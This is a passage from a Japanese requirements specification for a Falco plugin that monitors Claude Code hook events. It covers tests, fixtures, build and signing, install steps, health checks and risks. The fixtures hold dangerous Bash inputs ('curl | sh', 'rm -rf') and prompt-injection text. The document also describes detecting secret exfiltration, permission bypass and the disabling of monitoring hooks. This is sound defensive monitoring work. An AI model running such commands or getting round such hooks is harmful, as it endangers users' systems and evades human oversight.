| P010 | Fields/Extract 不一致 | §6.3 FP-008/FP-009, §23.2 |
| P011 | YAML コメント形式起因の parse error | §13 R-010 (YAML lint), Phase 3 Gate |
| P012 | rules ファイル分割の重複定義 | §13 R-005 |
| P013 | ビルド環境差異（macOS で Linux 用 .so） | §7.4, §21.2 B-002/B-005 |
| P014 | 起動時に既存ログ全行再処理 | §6.2 ES-004, §14.1 P-006, §27 Start position |
| P015 | log rotation でファイル追従不可 | §6.2 ES-005, §6.3 FP-006 |
| P016 | log line truncation / 大型イベントで OOM | §6.1.1 HL-012, §14.2 D-004, §27 Max event size |
| P017 | macOS Falco output 設定でクラッシュ | §7.2 MAC-002, §18.1 |
| P018 | `-U` 不付与で macOS で alert 抑制 | §7.2 MAC-003, §18.3 |
| P019 | 1 ルールに複数イベントが混入 | §13 R-005/R-006 |
| P020 | required_plugin_versions 未指定で互換性破綻 | §13 R-003 |
| P021 | release artifact 整合性チェック欠如 | §21.2 B-007, AC-013, SEC-009 |
| A コード | nginx-proxy 由来の追加パターン群 | dev-kit Phase 6 の feedback で整理。本要件では `RK-*` リスクとして吸収 |

> 実装中に該当パターンを踏みかけた場合は `/plugin-debug` を呼び、修正と同時に必要なら `dev-kit-feedback` で新しい P コード候補（または本マッピングの更新）を提出する。

---

## 19. 開発ワークフロー要件

falco-plugin-dev-kit の Phase 0〜6 に沿って進める。ただし Claude Code plugin 固有の hook logger と schema を Phase 0/1/2 に追加する。

### Phase 0: 要件確認・設計固定

| Task | 内容 | 完了条件 |
|---|---|---|
| P0-001 | plugin name/source/fields決定 | `claude-code`, `claude_code`, `claude_code.*` で確定 |
| P0-002 | hook logger schema決定 | `schema_version` と field list 確定 |
| P0-003 | Hook events scope決定 | v0.1対象イベント一覧確定 |
| P0-004 | macOS runtime要件確定 | `.dylib`, `falco-local.yaml`, `-U` |
| P0-005 | OTel位置付け確定 | primaryではなく parallel correlation |
| P0-006 | threat categories確定 | T-001〜T-018 |

### Phase 1: Scaffold

| Task | 内容 | 完了条件 |
|---|---|---|
| P1-001 | dev-kit scaffold | Go project生成 |
| P1-002 | hook logger package追加 | `cmd/claude-code-security-logger` |
| P1-003 | plugin skeleton | required methods 実装 |
| P1-004 | Falco config生成 | `falco.yaml`, `falco-local.yaml`, `falco-docker.yaml` |
| P1-005 | rules skeleton | `rules/claude_code_rules.yaml` |
| P1-006 | initial fixtures | Hook input fixture作成 |
| Gate | `go vet ./...` | PASS |

### Phase 2: Parser / Logger / Detector

| Task | 内容 | 完了条件 |
|---|---|---|
| P2-001 | logger stdin JSON parser | Hook JSONを読み取れる |
| P2-002 | redaction実装 | secrets test PASS |
| P2-003 | JSONL append実装 | permission/atomic append test PASS |
| P2-004 | plugin JSONL parser | normalized event parse PASS |
| P2-005 | detector実装 | T-001〜T-018 pattern PASS |
| P2-006 | fsnotify/polling | append ingestion PASS |
| Gate | `go test ./pkg/...` | PASS |

### Phase 3: Rules

| Task | 内容 | 完了条件 |
|---|---|---|
| P3-001 | list/macro/rule作成 | 初期ルール10+ |
| P3-002 | best practice check | `source`, `evt.type`, order確認 |
| P3-003 | output設計 | secretなし、必要情報あり |
| P3-004 | required_plugin_versions | rulesに追加 |
| Gate | `falco -V` または YAML lint | PASS |

### Phase 4: Tests

| Task | 内容 | 完了条件 |
|---|---|---|
| P4-001 | Unit tests | logger/parser/detector |
| P4-002 | Level 1 pattern tests | category別 true/false |
| P4-003 | Level 2 pipeline tests | Open/NextBatch/Extract/GOB/rotation |
| P4-004 | Level 3 Falco integration | sample alert発火 |
| P4-005 | macOS native integration | `.dylib` + `falco-local.yaml` |
| P4-006 | OTel correlation fixture | `tool_use_id` linkage確認 |
| Gate | `go test ./...`, `make e2e` | PASS |

### Phase 5: Build / Package

| Task | 内容 | 完了条件 |
|---|---|---|
| P5-001 | Linux build | `.so`, `-buildmode=c-shared`, ELF検証 |
| P5-002 | macOS build | `.dylib`生成 |
| P5-003 | checksums | SHA256生成 |
| P5-004 | release assets | logger binary, plugin, rules, configs, docs |
| P5-005 | CI/CD | GitHub Actions matrix |
| Gate | `make build`, `make verify`, `make package` | PASS |

### Phase 6: Report / Feedback

| Task | 内容 | 完了条件 |
|---|---|---|
| P6-001 | 完了レポート | generated files, test results, rules summary |
| P6-002 | dev-kit feedback | 新規パターン/Pコード候補整理 |
| P6-003 | README/INSTALL | macOS/Linux/OTel導入手順 |
| P6-004 | backlog更新 | v0.2以降の課題整理 |

---

## 20. テスト要件

### 20.1 3層E2E + Claude Code固有テスト

| Level | 名称 | Falco | 内容 |
|---|---|---|---|
| Unit | logger/parser/detector | 不要 | Hook fixture parse、redaction、risk classification |
| Level 1 | Pattern coverage | 不要 | T-001〜T-018 の true positive / true negative |
| Level 2 | Plugin pipeline | 不要 | Open/NextBatch/Extract/GOB/file tail/rotation/backpressure |
| Level 3 | Falco integration | 必要 | plugin load、rule発火、output検証 |
| Level 3 macOS | macOS native | 必要 | `.dylib`, `falco-local.yaml`, `-U`, `--disable-source syscall` |
| OTel fixture | Correlation | 不要/任意 | Hook event と OTel event の `tool_use_id` 相関 |

### 20.2 必須fixture

**配置先（標準）**: `test/fixtures/hook_events/<event_name>/<scenario>.json`
（例: `test/fixtures/hook_events/PreToolUse/bash_dangerous.json`）

Level 1 パターンテスト（`test/e2e/patterns/categories/<T-NNN>.json`）は本表のヒューマン fixture を引用してカテゴリ別 JSON を生成する。同じ fixture を Unit テストと Level 1 で共有する。

| Fixture | 内容 |
|---|---|
| `pre_tool_use_bash_safe.json` | `npm test` 等の正常Bash |
| `pre_tool_use_bash_dangerous.json` | `curl | sh`, `rm -rf` |
| `permission_request_add_allow.json` | 永続allow追加 |
| `config_change_settings.json` | `.claude/settings.json` 変更 |
| `file_changed_env.json` | `.env` 変更 |
| `post_tool_batch_many_reads.json` | tool_count多発 |
| `mcp_tool_write.json` | MCP write/delete/admin操作 |
| `user_prompt_injection.json` | prompt injection文言 |
| `sensitive_read_env.json` | `.env` read |
| `benign_webfetch_docs.json` | 正常WebFetch |
| `redaction_aws_key.json` | AWS secret redaction |
| `redaction_private_key.json` | private key redaction |
| `malformed_line.txt` | 不正JSON |
| `large_event.json` | サイズ制限 |
| `rotation_scenario`（手順） | log rotate のシナリオ |

#### 20.2.1 `rotation_scenario` の具体手順

`rotation_scenario` は単一 fixture ではなく **シナリオ**である。Level 2 パイプラインテストの一部として次の流れを再現する:

```go
// Level 2 テスト内（plugin_test.go.tmpl の TestPipeline_Rotation）
func TestPipeline_Rotation(t *testing.T) {
    // 1) 既存 events.jsonl に 10 行書く
    writeNLines(t, eventsPath, 10, "rotation-pre")

    // 2) plugin Open() — SeekEnd で末尾から読み始める
    plugin := initPlugin(t, []string{eventsPath})
    inst := openAndCleanup(t, plugin)

    // 3) plugin が稼働中に rename rotation を起こす
    require.NoError(t, os.Rename(eventsPath, eventsPath+".1"))

    // 4) 同名で新規 events.jsonl を作成し 5 行書く（新 inode）
    writeNLines(t, eventsPath, 5, "rotation-post")

    // 5) NextBatch で post-rotation の 5 行が取れること（pre-rotation の 10 行は SeekEnd で読まない）
    events := drainEvents(t, inst, 5, 10*time.Second)
    require.Len(t, events, 5)
    for _, ev := range events {
        require.Contains(t, ev.Raw, "rotation-post")
    }
}
```

代替パターンとして truncate rotation（`> events.jsonl` で同 inode の中身を空に）も別 TC として実装する。`P015 / RK-008 / FP-006` の検証対象。

### 20.3 受け入れ基準

| ID | 基準 | 実行コマンド | 判定方法 |
|---|---|---|---|
| TEST-001 | Unit tests が全て PASS | `go test ./pkg/... -v -race -count=1` | exit 0 / PASS 行数 = 全テスト関数数 |
| TEST-002 | Level 1 pattern tests が T-001〜T-018 を網羅 | `make e2e-pattern`（`go test ./test/e2e/ -v -run TestPattern`） | 全 T-* で True Positive 検出、テスト出力に `risk_type=<expected>` が含まれる |
| TEST-003 | benign pattern で重大 false positive がない | `go test ./test/e2e/ -v -run TestPattern_Benign` | 全 benign fixture で `risk_score < 50` または検出なし |
| TEST-004 | redaction test で secret 値が出力されない | `go test ./pkg/parser/ -v -run TestRedaction` | 出力 JSON に `AKIA*` `xoxb-*` `-----BEGIN .* PRIVATE KEY-----` 等が含まれない（grep -L） |
| TEST-005 | Level 2 pipeline が fsnotify/polling/rotation/backpressure を通す | `make e2e-pipeline`（`go test ./cmd/plugin-sdk/ -v -race -run TestPipeline -timeout 120s`） | TestPipeline_FsNotify / TestPipeline_Polling / TestPipeline_Rotation / TestPipeline_Backpressure すべて PASS |
| TEST-006 | Level 3 Falco integration で代表 CRITICAL/WARNING/NOTICE が発火 | `e2e/scripts/inject_patterns.sh` を実行し Falco stdout を `e2e/scripts/batch_analyzer.py` で解析 | 代表 3 ルール（T-001 / T-005 / T-013）の alert が JSON 出力に出現 |
| TEST-007 | macOS native test で alert が stdout JSON として出る | `falco -c falco-local.yaml --disable-source syscall -U &` 後に Hook fixture を投入し stdout 観察 | `[CLAUDE_CODE` を含む alert 行が JSON で出力 |
| TEST-008 | latency test が最低条件 p95 ≤ 5s を満たす | `go test ./test/latency/ -v -run TestLatencyP95` | 後述の §20.3.1 latency 計測手順 |

#### 20.3.1 TEST-008 latency 計測手順

```go
// test/latency/latency_test.go (擬似コード)
func TestLatencyP95(t *testing.T) {
    // 投入 fixture: pre_tool_use_bash_dangerous.json (T-001 を確実発火)
    // 反復: N=1000 行を 100 events/sec で append（10 秒間）
    // 計測区間: 行 append 時刻 (t0) → Falco alert stdout 観測時刻 (t1)
    //   t0 = events.jsonl への WriteString 直前の time.Now()
    //   t1 = stdout から `[CLAUDE_CODE CRITICAL] Dangerous Bash Command` を含む行が読めた時刻
    // 各サンプルの latency = t1 - t0 を集計
    // p95 を sort して算出（latencies[int(0.95 * len(latencies))]）

    // 合格基準:
    //   p95 ≤ 5000ms（最低条件、§8.2 SLO）
    //   目標: p95 ≤ 1000ms

    // 環境前提: macOS arm64 / Linux amd64 のいずれか、Falco process は事前起動
}
```

CI では合格基準を **最低条件 p95 ≤ 5s** とし、目標値（p95 ≤ 1s）は本番環境向け SLO 監視（OPS-002 / OPS-003）で測る。

---

## 21. Build / Release 要件

### 21.1 Artifacts

| Artifact | 対象 | 備考 |
|---|---|---|
| `libclaude-code-plugin-linux-amd64.so` | Linux amd64 | 本番配布用。ELF shared object。 |
| `libclaude-code-plugin-linux-arm64.so` | Linux arm64 | 可能なら。 |
| `libclaude-code-plugin-darwin-arm64.dylib` | macOS Apple Silicon | local runtime用。 |
| `claude-code-security-logger-darwin-arm64` | macOS | Hook logger。 |
| `claude-code-security-logger-linux-amd64` | Linux | Hook logger。 |
| `rules/claude_code_rules.yaml` | all | Falco rules。 |
| `falco.yaml` | Linux | production example。 |
| `falco-local.yaml` | macOS | local example。 |
| `otel-collector-claude-code.yaml` | optional | OTel filelog example。 |
| `checksums.sha256` | all | integrity check。 |

### 21.2 Build rules

| ID | 要件 |
|---|---|
| B-001 | Linux plugin build は `CGO_ENABLED=1 GOOS=linux GOARCH=amd64 go build -buildmode=c-shared` を必須にする。 |
| B-002 | macOS plugin build は `.dylib` として行う。Linux `.so` を macOSで無理に作らない。 |
| B-003 | `file` コマンドで Linux artifact が `ELF 64-bit LSB shared object` であることを確認する。 |
| B-004 | release asset 名に OS/arch を含める。 |
| B-005 | GitHub Actions matrix で Linux/macOS を分ける。 |
| B-006 | GLIBC互換性を確認する。 |
| B-007 | checksum を必ず生成する。コマンド例: Linux は `sha256sum lib*.so > checksums.sha256`、macOS は `shasum -a 256 lib*.dylib > checksums.sha256`。release.yml の matrix で OS を分岐し最後に `cat` で 1 ファイルに統合。検証側は `sha256sum -c checksums.sha256` (Linux) / `shasum -a 256 -c checksums.sha256` (macOS)。 |

### 21.3 Supply chain 対応（SBOM / 署名）

監視ツール自体が改ざんされると検知が無効化されるため、release artifact の出所と完全性を担保する。

| ID | 要件 | v0.1 | v0.2 以降 |
|---|---|---|---|
| SC-001 | SHA-256 checksum (`checksums.sha256`) | **必須** | 維持 |
| SC-002 | SBOM 生成（CycloneDX JSON または SPDX） | 推奨（Syft / `go-licenses` で自動生成可） | 必須 |
| SC-003 | artifact 署名（cosign keyless / Sigstore） | 推奨（GitHub Actions OIDC で keyless 署名） | 必須 |
| SC-004 | Provenance（SLSA Build L1 以上） | 任意 | 必須（SLSA L3 を目標） |
| SC-005 | dependencies 脆弱性スキャン（govulncheck, trivy fs） | CI に組み込む | 維持 |
| SC-006 | hook logger と plugin 双方の署名・検証手順を README に記載 | 推奨 | 必須 |

> v0.1 では checksum を必須、SBOM / cosign 署名は推奨。v0.2 で SBOM と cosign 署名を必須化し、v0.6〜v1.0 で SLSA Provenance L3 / Plugin Registry 登録を目指す。

#### 21.3.1 v0.1 で先行導入する最小実装例

**SBOM 生成（推奨、release.yml に組み込み可能）**:
```yaml
- name: Generate SBOM
  uses: anchore/sbom-action@v0
  with:
    path: .
    format: cyclonedx-json
    output-file: sbom.cdx.json
    artifact-name: claude-code-plugin-sbom
```
ローカルで生成する場合: `syft scan dir:. -o cyclonedx-json=sbom.cdx.json`

**cosign keyless 署名（推奨）**:
```yaml
permissions:
  id-token: write   # OIDC for keyless signing
  contents: write
steps:
  - uses: sigstore/cosign-installer@v3
  - name: Sign artifact
    run: |
      cosign sign-blob --yes lib${{ env.PLUGIN_NAME }}-plugin-${{ matrix.os }}-${{ matrix.arch }}.${{ matrix.ext }} \
        --output-signature lib${{ env.PLUGIN_NAME }}-plugin-${{ matrix.os }}-${{ matrix.arch }}.${{ matrix.ext }}.sig \
        --output-certificate lib${{ env.PLUGIN_NAME }}-plugin-${{ matrix.os }}-${{ matrix.arch }}.${{ matrix.ext }}.crt
```

ユーザ側の検証: `cosign verify-blob --certificate <cert> --signature <sig> <binary>`

---

## 22. 運用要件

### 22.1 個人macOS導入

> **前提**: `claude-code-security-logger` は本プロジェクトで新規実装するバイナリ（要件 §6.1）であり、dev-kit scaffold には含まれない。Phase 1 で `cmd/claude-code-security-logger/` ディレクトリを手動で作成し、Phase 2 で実装、Phase 5 でビルド・配布する。下記手順 1 の `claude-code-security-logger-darwin-arm64` は本プロジェクトの release artifact（§21.1）として配布されるバイナリを指す。

```bash
# 0. download release artifacts (logger / plugin / falco-local.yaml / rules / checksums)
RELEASE=https://github.com/takaosgb3/falco-plugin-claude_code/releases/download/v0.1.0
mkdir -p ~/.local/share/claude-code-falco && cd ~/.local/share/claude-code-falco
for f in claude-code-security-logger-darwin-arm64 \
         libclaude-code-plugin-darwin-arm64.dylib \
         falco-local.yaml \
         claude_code_rules.yaml \
         claude_code_health.yaml \
         checksums.sha256; do
  curl -fLO "$RELEASE/$f"
done
shasum -a 256 -c checksums.sha256   # 完全性検証

# 1. install logger
install -m 0755 claude-code-security-logger-darwin-arm64 ~/.local/bin/claude-code-security-logger

# 2. prepare log directory
mkdir -p ~/.claude/security
chmod 700 ~/.claude/security
touch ~/.claude/security/events.jsonl
chmod 600 ~/.claude/security/events.jsonl

# 3. configure hooks in ~/.claude/settings.json or .claude/settings.local.json
# 4. run Falco local（カレントの falco-local.yaml と rules/ を読む）
cd ~/.local/share/claude-code-falco
falco -c falco-local.yaml --disable-source syscall -U
```

### 22.1.1 Linux production 導入

```bash
# 0. download release artifacts
RELEASE=https://github.com/takaosgb3/falco-plugin-claude_code/releases/download/v0.1.0
sudo mkdir -p /opt/claude-code-falco && cd /opt/claude-code-falco
for f in claude-code-security-logger-linux-amd64 \
         libclaude-code-plugin-linux-amd64.so \
         falco.yaml \
         claude_code_rules.yaml \
         claude_code_health.yaml \
         checksums.sha256; do
  sudo curl -fLO "$RELEASE/$f"
done
sudo sha256sum -c checksums.sha256

# 1. install logger（system-wide）
sudo install -m 0755 claude-code-security-logger-linux-amd64 /usr/local/bin/claude-code-security-logger

# 2. install plugin（Falco 既定パス）
sudo install -m 0644 libclaude-code-plugin-linux-amd64.so /usr/share/falco/plugins/

# 3. install rules
sudo install -m 0644 -d /etc/falco/rules.d
sudo install -m 0644 claude_code_rules.yaml claude_code_health.yaml /etc/falco/rules.d/

# 4. install Falco config
sudo install -m 0644 falco.yaml /etc/falco/falco.yaml.d/claude_code.yaml
# /etc/falco/falco.yaml には plugins / load_plugins / rules_files の参照を追記

# 5. prepare per-user log directory（developer ごと）
mkdir -p ~/.claude/security && chmod 700 ~/.claude/security
touch ~/.claude/security/events.jsonl && chmod 600 ~/.claude/security/events.jsonl

# 6. configure hooks（user / project settings）
# ~/.claude/settings.json に hooks ブロックを追加（§6.1.3 の例参照）

# 7. enable Falco service
sudo systemctl enable --now falco
sudo journalctl -u falco -f   # alert を確認
```

> **systemd 注意**: Falco の rules_files に `/etc/falco/rules.d/claude_code_rules.yaml` と `/etc/falco/rules.d/claude_code_health.yaml` の **両方を個別パスで列挙**する（P007）。`/etc/falco/rules.d/*.yaml` のような glob 指定では既存の Falco rules と順序が崩れる場合がある。

### 22.2 チーム導入

| 項目 | 方針 |
|---|---|
| Hook設定 | `.claude/settings.json` に共有する場合はレビュー必須。個人検証は `.claude/settings.local.json`。 |
| Logger配布 | checksum付きbinaryまたはpackage manager。 |
| Falco実行 | 各端末local、または集中ログ/remote collector経由。 |
| OTel | managed settingsで endpoint/env を配布。 |
| Policy | managed settingsで hooks/MCP/permissions を制御する。 |

### 22.3 企業導入

| 項目 | 方針 |
|---|---|
| Managed settings | hooks, OTel env, permissions, MCP allow/deny を集中管理。 |
| MDM | macOSでは managed preferences / file-based managed settings を検討。 |
| SIEM | Falco alerts と OTel logs を集約。 |
| Retention | local短期、centralは監査要件に従う。 |
| Privacy | prompt/tool content収集は明示ポリシーとredaction前提。 |

### 22.4 Health check / 監視戦略

監視ツール自体の sanity check を v0.1 で必ず提供する。

| ID | 要件 |
|---|---|
| OPS-001 | Hook logger に `--selftest` モードを実装し、stdin 固定 fixture → 出力 JSONL を検証できる。CI / オンボーディング手順で利用する。 |
| OPS-002 | Hook logger は処理件数 / redaction 件数 / write error / drop 件数を期間集計し、`logger_stats.jsonl` などに 1 分粒度で書き出す（任意機能、v0.1 では推奨）。 |
| OPS-003 | Falco plugin は §6.3 FP-011 の counter を `claude_code.dropped` 等の field か、`falco --dry-run` / Prometheus 互換 metrics で観測可能にする。v0.1 は logging（debug 出力）で代用可。 |
| OPS-004 | **Self-check rule**: `events.jsonl` に最近 N 分（既定 15 分）書き込みが無い場合に WARNING を出すルールを rule pack に同梱する。logger 停止 / hooks 無効化を運用側で気付くため。<br>**運用注意**: idle 中の Claude Code（ユーザーが PC から離れている状態）でも N 分閾値を超え得る。`SessionEnd` を hook で受信した直後はタイマーをリセットする、または rule の閾値を業務時間帯のみに適用する設定を README に記載する。<br>**配置先**: 通常検出ルール（`rules/claude_code_rules.yaml`）とは別ファイル `rules/claude_code_health.yaml` に切り出す。Falco の `rules_files` には両方を個別パスで列挙する（P007）。理由: self-check は時刻ベースで通常 condition と性質が異なり、誤って削除/無効化されにくくするため。 |
| OPS-005 | `events.jsonl` の `tail -n 1` で最後の `received_at` を取得する CLI（`claude-code-security-logger doctor`）を v0.1 で提供。<br>**exit code 仕様**: `0` = 最後の受信が閾値内（既定 15 分）、`1` = events.jsonl は存在するが空、`2` = events.jsonl が存在しない/読めない、`3` = 最後の受信が閾値超過。任意の閾値は `--max-age <duration>` で上書きできる。<br>**duration 形式**: Go `time.ParseDuration` 互換（例: `--max-age 15m`, `--max-age 1h30m`, `--max-age 30s`）。整数だけの指定（`--max-age 900`）は受け付けず、必ず単位（`s/m/h`）を付けて検証時のエラーを防ぐ。 |
| OPS-006 | hook logger / Falco の死活は OS のサービスマネージャ（macOS launchd, Linux systemd）に任せる。プラグインから OS サービスを起動・監視はしない（責務分離）。 |

### 22.5 Container / Kubernetes での扱い

| 観点 | v0.1 方針 |
|---|---|
| 監視対象 | Claude Code は CLI / IDE で developer workstation 実行が主であり、container / k8s pod 内での Claude Code 監視は v0.1 では非対象。 |
| Falco の実行形態 | Falco を k8s DaemonSet で運用している組織でも、本プラグインは `~/.claude/security/events.jsonl` の host-level tail を前提とする。pod 側に hook logger を入れても events.jsonl をどう node に共有するかは未保証。 |
| 検討事項 | container 内 Claude Code を監視する場合は、(a) container volume で events.jsonl を host にマウント、(b) sidecar として hook logger を動かす、のいずれかが必要。これらは v0.3 以降で具体化する。 |
| 影響 | §21 の release artifact は host バイナリ（macOS `.dylib` / Linux `.so`）であり、container image 配布は v0.4 以降のロードマップで検討する。 |

---

## 23. リスク、未解決課題、整合性チェック

### 23.1 リスク一覧

| ID | リスク | 影響 | 対策 |
|---|---|---|---|
| RK-001 | Claude Code Hook schema変更 | parser破損 | schema_version、fixtures、unknown fields許容、公式docs定期確認 |
| RK-002 | `events.jsonl` が標準出力だと誤解 | 導入失敗 | READMEと要件で「hook logger出力」と明記 |
| RK-003 | hook loggerがstdoutに出してClaude context汚染 | 誤動作 | stdout quietテスト |
| RK-004 | secrets redaction漏れ | 情報漏洩 | redaction test、deny raw payload、0600 |
| RK-005 | macOS artifact誤配布 | plugin load不可 | artifact命名、file検証 |
| RK-006 | Falco rule不発火 | 検知不能 | source/evt.type/Fieldsチェック |
| RK-007 | OTel raw bodies有効化 | 大規模情報漏洩 | managed policyで禁止/制限 |
| RK-008 | fsnotify timing不安定 | flaky tests | polling fallback、wait調整 |
| RK-009 | false positive過多 | 運用疲れ | benign tests、severity調整、allowlist |
| RK-010 | MCP supply-chain | 外部接続悪用 | MCP config change検知、allowlist、managed MCP |
| RK-011 | hook disabled by project setting | 監視停止 | ConfigChange、managed hooks、health check |
| RK-012 | cross-source相関できない | syscall連携不足 | SIEM/OTelで相関、Falco内には期待しない |

### 23.2 整合性チェックリスト

| チェック | OK条件 |
|---|---|
| input | `events.jsonl` は hook logger 出力として説明されている |
| architecture | primary detection path と OTel path が分離されている |
| macOS | local runtime として `.dylib` / `falco-local.yaml` / `-U` がある |
| rules | 全ruleに `source: claude_code` がある |
| fields | `Fields()` と `Extract()` が一致する |
| privacy | raw prompt/tool_responseを保存しない設計になっている |
| prevention | optional hook policy として分離されている |
| testing | Hook fixtures、redaction、latency、macOS Level 3 がある |
| build | Linux `.so` と macOS `.dylib` が混同されない |
| registry | Plugin ID は開発用999、本番で正式取得と明記 |

---

## 24. v0.1 Minimum Viable Scope

v0.1 では、以下に絞って「動く・検知できる・安全に配布できる」を優先する。

| 項目 | v0.1 必須 |
|---|---|
| Hook logger | Go binary、stdin JSON → redacted JSONL |
| Events | SessionStart, UserPromptSubmit, PreToolUse, PermissionRequest, PostToolUse, PostToolBatch, PermissionDenied, ConfigChange, FileChanged |
| Plugin | JSONL tail source plugin + field extraction |
| Rules | **最低 10 ルール、目標 18 ルール（§29 付録 B の T-001〜T-018 全網羅）**。Dangerous Bash (T-001)、Secret Exfiltration (T-002)、Permission Bypass (T-003)、Settings/Hook 変更 (T-005/T-006)、MCP 変更 (T-007) は必須 |
| macOS | `.dylib`, `falco-local.yaml`, local run手順 |
| Linux | `.so`, `falco.yaml`, CI build |
| OTel | native OTel correlation guidance + filelog example。plugin内OTLPなし |
| Tests | unit + Level1 + Level2 + representative Level3 |
| Docs | README、INSTALL、SECURITY、requirements v3 |

---

## 25. v0.2 以降のロードマップ

| Version | 候補 |
|---|---|
| v0.2 | optional prevention hook policy、ConfigChange block、managed settings deployment guide、**SBOM / cosign 署名の必須化（§21.3 SC-002/SC-003）** |
| v0.3 | local sidecar / Unix domain socket input、higher throughput、health endpoint、**container 内 Claude Code 監視（events.jsonl の host 共有 or sidecar 方式の検討、§22.5）** |
| v0.4 | OTel/SIEM correlation dashboards、Falcosidekick integration recipes、**Falco DaemonSet (Kubernetes) 統合パターン**、container image 配布の検討 |
| v0.5 | Claude Code plugin bundle 配布、marketplace 対応、hook logger 自動設定 |
| v0.6 | risk scoring tuning、organization policy packs、allowlist management、**SLSA Provenance L3 への到達（§21.3 SC-004）** |
| v1.0 | Plugin Registry 登録、安定 schema、運用実績、包括的 E2E |

---

## 26. 受け入れ基準

| ID | 受け入れ基準 |
|---|---|
| AC-001 | 通常の Claude Code で Hook 設定により `~/.claude/security/events.jsonl` が生成される。 |
| AC-002 | `events.jsonl` が Claude Code 標準ログではなく hook logger 出力であることが README/要件/INSTALL に明記されている。 |
| AC-003 | macOS で Falco plugin `.dylib` をロードし、`source: claude_code` のalertが発火する。 |
| AC-004 | Linux で `.so` をロードし、代表ルールが発火する。 |
| AC-005 | `PreToolUse` の dangerous Bash fixture で CRITICAL alert が出る。 |
| AC-006 | `ConfigChange` の hooks無効化 fixture で CRITICAL alert が出る。 |
| AC-007 | `MCP config changed` fixture で WARNING alert が出る。 |
| AC-008 | secret redaction test で秘密値が JSONL/Falco output に残らない。 |
| AC-009 | p95 end-to-end latency が最低5秒以内、目標1秒以内。 |
| AC-010 | rules で `evt.type` を使っていない。 |
| AC-011 | `Fields()` と `Extract()` の不一致がない。 |
| AC-012 | `go vet ./...`, `go test ./...`, `make e2e` がPASS。 |
| AC-013 | Linux artifact が ELF shared object、macOS artifact が Mach-O dylib として検証されている。 |
| AC-014 | OTel 連携は主入力ではなく相関・可観測性としてドキュメント化されている。 |

---

## 27. 実装時の初期値

### 27.1 プラグイン基本値

| 項目 | 初期値 |
|---|---|
| Repository | `falco-plugin-claude-code` |
| Plugin name | `claude-code` |
| Event source | `claude_code` |
| Field prefix | `claude_code.*` |
| Plugin ID | `999` for development（注: 公開前に Falco Plugin Registry で正式 ID を取得する。Registry で予約済みの場合は別の暫定値を選ぶ） |
| Version | `0.1.0` |
| License | Apache-2.0 |
| Author | `takaosgb3`（GitHub username、Go module path 用に確定）。`FALCOYA` は OSS organization 表記として README / LICENSE クレジット用に併記 |
| Logger binary | `claude-code-security-logger`（本プロジェクトで新規実装、§6.1） |
| Default log path | `~/.claude/security/events.jsonl` |
| Log format | normalized JSONL |
| Start position | `end` |
| Buffer size | macOS 1024 / Linux 4096 |
| Poll interval | 250ms |
| Max event size | 64KB |
| Evidence max | 2KB |
| Directory mode | `0700` |
| File mode | `0600` |
| Redaction | enabled by default |
| Raw payload | disabled by default |

### 27.2 ツールチェーンとプラットフォーム要件

| 項目 | 初期値 |
|---|---|
| Plugin SDK | `github.com/falcosecurity/plugin-sdk-go` `v0.8.1`（minor は維持しつつ patch 追従。SDK のメジャー昇格時は major version bump として扱う） |
| Go 最小バージョン | 1.22 以上（plugin-sdk-go v0.8 の要件に合わせる） |
| Falco 最小バージョン | 0.38 以上（plugin API v3、`required_plugin_versions` 対応） |
| macOS 最低サポート | macOS 13 (Ventura) 以上、Apple Silicon (arm64) を主、Intel (amd64) は best-effort |
| Linux 最低サポート | glibc 2.31 以上（Ubuntu 20.04 / Debian 11 / RHEL 9 相当）。CI で確認する |
| ビルドフラグ | `CGO_ENABLED=1` + `-buildmode=c-shared`（P002 必須） |
| アーキテクチャ | linux/amd64, linux/arm64, darwin/arm64（darwin/amd64 は best-effort） |

### 27.3 scaffold 入力ワークシート（dev-kit `/plugin-scaffold claude-code json` 起動時の対話入力一覧）

`/plugin-scaffold claude-code json` を起動したときに対話で聞かれる項目と、本要件における回答セット。実装時はこの表を上から順に答える。

| 順序 | プロンプト項目 | 回答（このプラグインでの値） | 出典 |
|---:|---|---|---|
| 1 | プラグイン名（小文字） | `claude-code` | §27.1 |
| 2 | プラグイン名（大文字） | `CLAUDE_CODE` | §27.1（自動生成） |
| 3 | プラグイン名（CamelCase） | `ClaudeCode` | §27.1（自動生成） |
| 4 | Plugin ID | `999`（dev 用、リリース前に Registry で正式取得） | §6.3 FP-003, §27.1 |
| 5 | Event source | `claude_code` | §27.1 |
| 6 | Field prefix | `claude_code.*` | §27.1 |
| 7 | Version | `0.1.0` | §27.1 |
| 8 | License | `Apache-2.0` | §27.1 |
| 9 | Author（GitHub username, Go module path 用） | `takaosgb3` | §27.1（RH1-04 で確定） |
| 10 | Organization 表記（README クレジット用） | `FALCOYA` | §27.1 |
| 11 | Plugin description | `Claude Code Hook event monitoring plugin for Falco` | §0, §22 |
| 12 | LogPath（既定） | `~/.claude/security/events.jsonl` | §6.2 ES-001 |
| 13 | LogFormat | `json` | §10 |
| 14 | TimeFormat（RFC3339） | `2006-01-02T15:04:05Z07:00` | §10.1, §27.1 |
| 15 | Plugin SDK バージョン | `v0.8.1` | §27.2 |
| 16 | Go 最小バージョン | `1.22` | §27.2 |
| 17 | Falco 最小バージョン | `0.38` | §27.2 |
| 18 | LogSource（CLAUDE.md / README で監視対象を表示） | `Claude Code Hooks (normalized JSONL via claude-code-security-logger)` | §6.1 |
| 19 | ドメイン固有フィールド一覧（`${DOMAIN_FIELDS_*}` 用） | §10.2 の `claude_code.*` 全フィールド表をそのまま投入 | §10.2 |

> **補足**: 項目 19 で投入するフィールドは §10.2 の表（`claude_code.schema_version` 〜 `claude_code.raw_excerpt` の全 28 項目）を JSON / YAML / CSV のどれかで scaffold スキルに渡す。スキル側のフォーマットに従うこと。詳細は dev-kit `.claude/skills/plugin-scaffold/SKILL.md` を参照。

---

## 28. 付録A: Hook event coverage matrix

> 下表の hook event 名は Claude Code 公式仕様に依存する。`UserPromptExpansion` / `PostToolBatch` / `Elicitation` / `Result` / `WorktreeCreate` / `WorktreeRemove` などはバージョンによって追加・改名・廃止される可能性があるため、リリース前に `https://code.claude.com/docs/en/hooks` の最新版を確認し、fixtures と差分テストを行う。本要件で「必須」と分類した event でも、Claude Code 側で当該 hook が利用不可になった場合は実装上 fallback（OTel / 上位 event 観測）にダウングレードする。

| Event | v0.1 | 主な用途 | 備考 |
|---|---:|---|---|
| SessionStart | 必須 | session/model/source監査 | fast hook必須 |
| UserPromptSubmit | 必須 | prompt injection/秘密情報投入 | prompt redaction必須 |
| UserPromptExpansion | 推奨 | slash command/skill direct invocation | v0.1 optionalでもよい |
